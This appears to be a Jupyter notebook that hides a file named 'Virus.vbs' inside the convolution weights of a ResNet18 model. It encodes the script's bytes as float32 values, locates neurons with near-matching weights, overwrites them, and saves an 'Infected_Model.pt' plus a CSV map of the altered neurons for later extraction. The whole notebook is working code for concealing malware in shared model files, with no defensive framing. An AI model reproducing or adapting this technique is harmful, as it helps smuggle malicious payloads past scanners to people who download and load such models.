```python
import os
import matplotlib.pyplot as plt
import pandas as pd
import numpy as np
%matplotlib inline
import numpy as np
import torch
from torch import nn
import torch.optim as optim
import torchvision
from torchvision import transforms, models, datasets
import imageio
import time
import warnings
import random
import sys
import copy
import json
from PIL import Image
```

```python
model_ft = models.resnet18()
model_ft.parameters()
model_dict = model_ft.state_dict()
model_dict.keys()
```

```python
conv = []
for i in model_dict.keys():
    if 'conv' in i:
        conv = conv + [i]
conv.reverse()
conv
```

```python
import struct
with open('Virus.vbs',mode = 'r') as f:
    file = f.read()

def str_to_byte(x):
    num = ord(x)
    byte = chr(num)
    return byte

bytes_ = []
for i in file:
    byte = str_to_byte(i)
    bytes_ = bytes_ + [byte]

bytes_list = []  
prefix = ['\x3c']
for i in range(0,270):
    comb = prefix+bytes_[i*3:(i+1)*3]
    bytes_list = bytes_list + [comb]

new_list = []
for i in bytes_list:
    word = ''
    for j in i:
        word = word + j
    bword = bytes(word, 'utf-8')
    param = struct.unpack(">f", bword)
    new_list = new_list + [param[0]]
new_list
```

```python
decode_conv = []
decode_j = []
decode_k = []
decode_l = []
decode_m = []
codes = []
for param in new_list:
  print(param)
  b = ''
  for i in conv:
    if b == 'break':
      break
    for j in range(len(model_dict[i])):
      if b == 'break':
        break
      for k in range(len(model_dict[i][j])):
        if b == 'break':
          break
        for l in range(len(model_dict[i][j][k])):
          if b == 'break':
            break
          for m in range(len(model_dict[i][j][k][l])):
            neuron = model_dict[i][j][k][l][m]
            code = i+str(j)+str(k)+str(l)+str(m)
            if code not in codes:
              if abs(neuron.numpy().tolist()-param)<=0.0001:
                decode_conv = decode_conv + [i]
                decode_j = decode_j + [j]
                decode_k = decode_k + [k]
                decode_l = decode_l + [l]
                decode_m = decode_m + [m]
                codes = codes + [code]
                b = 'break'
            if b == 'break':
              break
```

```python
Infected_Neurons = pd.DataFrame({
    'layer':decode_conv,
    'param1':decode_j,
    'param2':decode_k,
    'param3':decode_l,
    'param4':decode_m
})
Infected_Neurons.to_csv('Infected_Neurons.csv',index = None)
```

```python
new_model = model_ft.state_dict().copy()
for i in range(len(Infected_Neurons)):
  layer = Infected_Neurons['layer'][i]
  param1 = Infected_Neurons['param1'][i]
  param2 = Infected_Neurons['param2'][i]
  param3 = Infected_Neurons['param3'][i]
  param4 = Infected_Neurons['param4'][i]
  new_param = torch.Tensor([new_list[i]])[0]
  new_model[layer][param1][param2][param3][param4] = new_param
torch.save(new_model,'Infected_Model.pt')
```
